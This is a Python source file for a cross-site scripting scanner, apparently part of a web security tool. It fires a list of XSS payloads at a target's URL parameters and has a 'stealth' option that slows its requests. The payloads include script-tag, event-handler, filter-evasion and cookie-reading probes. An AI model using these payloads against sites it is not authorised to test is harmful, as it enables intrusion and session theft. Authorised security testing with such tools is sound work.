from core.scanner import BaseScanner
from typing import Dict, List, Optional
import asyncio
import re

class XSSScanner(BaseScanner):
    """Cross-Site Scripting vulnerability scanner"""
    
    def __init__(self, session, target: str, stealth: bool = False):
        super().__init__(session, target, stealth)
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[str]:
        """Load XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<script>alert(document.cookie)</script>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "<div onmouseover=alert('XSS')>hover</div>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<select autofocus onfocus=alert('XSS')>"
        ]
        
    async def scan(self) -> List[Dict]:
        """Execute XSS scan"""
        if '?' in self.target:
            await self._test_url_parameters()
            
        return self.results
        
    async def _test_url_parameters(self):
        """Test URL parameters for XSS"""
        base_url, params = self.target.split('?', 1)
        param_pairs = [p.split('=', 1) for p in params.split('&')]
        
        for param_name, param_value in param_pairs:
            for payload in self.payloads[:15 if self.stealth else len(self.payloads)]:
                test_params = {param_name: payload}
                test_url = self._build_url(base_url, test_params)
                
                result = await self.test_payload(payload, test_url)
                if result:
                    self.add_result(
                        'Cross-Site Scripting (XSS)',
                        'HIGH',
                        test_url,
                        f"Parameter '{param_name}' vulnerable with payload: {payload[:50]}..."
                    )
                    break
                    
                await asyncio.sleep(0.1 if self.stealth else 0)
                
    async def test_payload(self, payload: str, url: str) -> Optional[Dict]:
        """Test XSS payload"""
        # Get original response
        original_response = await self.http_client.get(self.target)
        
        # Test with payload
        test_response = await self.http_client.get(url)
        
        if original_response and test_response:
            is_vulnerable = self.validator.validate_xss(
                original_response.text,
                test_response.text,
                payload
            )
            
            if is_vulnerable:
                return {'vulnerable': True, 'payload': payload}
                
        return None
        
    def _build_url(self, base_url: str, params: Dict) -> str:
        """Build URL with parameters"""
        param_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        return f"{base_url}?{param_string}"
